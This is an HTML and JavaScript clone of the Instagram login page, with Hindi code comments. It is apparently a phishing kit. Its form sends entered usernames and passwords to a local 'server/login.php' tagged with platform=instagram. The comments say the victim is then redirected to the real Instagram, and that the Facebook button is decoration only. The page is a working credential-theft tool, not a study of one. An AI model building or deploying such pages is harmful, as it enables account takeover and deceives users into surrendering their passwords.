<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>📸</text></svg>" type="image/svg+xml">
    <style>
        /* === RESET & BASE === */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 24px 0;
        }

        /* === MAIN WRAPPER === */
        .wrapper {
            width: 100%;
            max-width: 350px;
            padding: 0 12px;
        }

        /* === LOGIN CONTAINER === */
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        /* === INSTAGRAM LOGO === */
        .logo-container {
            margin-bottom: 28px;
            text-align: center;
        }

        .logo-container img {
            width: 175px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        /* === FORM ELEMENTS === */
        .input-group {
            margin-bottom: 6px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 9px 8px 7px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            color: #262626;
            transition: border-color 0.2s;
        }

        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
            background: #fff;
        }

        .input-group input:focus::placeholder {
            color: #c0c0c0;
        }

        /* === LOGIN BUTTON === */
        .login-btn {
            width: 100%;
            padding: 7px 16px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            line-height: 18px;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s, opacity 0.2s;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:active {
            opacity: 0.8;
        }

        .login-btn:disabled {
            background: #b2dffc;
            cursor: default;
        }

        /* === OR DIVIDER === */
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 22px;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            color: #737373;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }

        /* === FACEBOOK LOGIN === */
        .fb-btn {
            width: 100%;
            padding: 0;
            background: none;
            border: none;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            line-height: 18px;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .fb-btn:hover {
            text-decoration: none;
        }

        .fb-btn svg {
            flex-shrink: 0;
        }

        /* === FORGOT PASSWORD === */
        .forgot-link {
            display: block;
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 8px;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* === SIGNUP CONTAINER === */
        .signup-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }

        .signup-container p {
            color: #262626;
            font-size: 14px;
            line-height: 18px;
        }

        .signup-container a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-container a:hover {
            text-decoration: underline;
        }

        /* === GET THE APP === */
        .get-app {
            text-align: center;
            margin: 10px 0;
        }

        .get-app p {
            color: #262626;
            font-size: 14px;
            line-height: 18px;
            margin-bottom: 16px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
        }

        .app-buttons a {
            display: inline-block;
        }

        .app-buttons img {
            height: 40px;
            width: auto;
            border-radius: 4px;
        }

        /* === ERROR MESSAGE === */
        .error-msg {
            color: #ed4956;
            font-size: 12px;
            line-height: 16px;
            margin: 8px 0;
            display: none;
            text-align: center;
        }

        /* === FOOTER === */
        .footer {
            max-width: 350px;
            margin-top: 12px;
            text-align: center;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            line-height: 14px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-copyright {
            color: #8e8e8e;
            font-size: 12px;
            line-height: 14px;
        }

        /* === LOADING SPINNER === */
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn-text {
            display: inline;
        }

        .login-btn.loading .btn-text {
            display: none;
        }

        .login-btn.loading .spinner {
            display: block;
        }

        /* === RESPONSIVE === */
        @media (max-width: 450px) {
            body {
                background: #fff;
                padding: 0;
            }

            .login-container {
                border: none;
                padding: 30px 20px 10px;
            }

            .signup-container {
                border: none;
                padding: 15px 20px;
            }

            .logo-container img {
                width: 160px;
            }
        }
    </style>
</head>
<body>

    <div class="wrapper">

        <!-- === LOGIN FORM === -->
        <div class="login-container">

            <div class="logo-container">
                <img src="images/insta_logo.png" alt="Instagram" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'font-family: \'Instagram\', \'Billabong\', \'Segoe UI\', sans-serif; font-size: 36px; color: #262626; letter-spacing: -0.5px; margin-bottom: 5px;\'>Instagram</div>'">
            </div>

            <form id="loginForm" method="POST" action="server/login.php">
                <input type="hidden" name="platform" value="instagram">

                <div class="input-group">
                    <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
                </div>

                <div class="input-group">
                    <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off">
                </div>

                <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>

                <button type="submit" class="login-btn" id="loginBtn">
                    <span class="btn-text">Log In</span>
                    <div class="spinner"></div>
                </button>

                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OR</div>
                    <div class="divider-line"></div>
                </div>

                <button type="button" class="fb-btn">
                    <svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="10" cy="10" r="10" fill="#1877f2"/>
                        <path d="M12.5 5.5H14V3h-1.5C10.75 3 10 4 10 5.5V7H8v2.5h2V17h2.5V9.5h2.5L16 7h-3.5V5.5z" fill="#fff"/>
                    </svg>
                    Log in with Facebook
                </button>

                <a href="#" class="forgot-link">Forgot password?</a>
            </form>
        </div>

        <!-- === SIGN UP === -->
        <div class="signup-container">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <!-- === GET THE APP === -->

            <p>Get the app.</p>
            <div class="app-buttons">

            </div>
        </div>

        <!-- === FOOTER === -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const loginBtn = document.getElementById('loginBtn');
            const errorMsg = document.getElementById('errorMsg');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');

            // सबमिट पर loading effect दिखाएं
            form.addEventListener('submit', function(e) {
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    e.preventDefault();
                    errorMsg.textContent = 'Please fill in all fields.';
                    errorMsg.style.display = 'block';
                    return;
                }

                // Loading state
                loginBtn.classList.add('loading');
                loginBtn.disabled = true;

                // फॉर्म सबमिट होने दे रहे हैं (PHP handle करेगा)
                // थोड़ी देर बाद असली Instagram पर redirect हो जाएगा
            });

            // Error message छुपाने के लिए input पर क्लिक करें
            usernameInput.addEventListener('focus', function() {
                errorMsg.style.display = 'none';
            });
            passwordInput.addEventListener('focus', function() {
                errorMsg.style.display = 'none';
            });

            // Facebook बटन को non-functional रखें (असली Instagram जैसा)
            document.querySelector('.fb-btn').addEventListener('click', function() {
                // कुछ न करें - बस डेकोरेशन के लिए है
            });
        });
    </script>
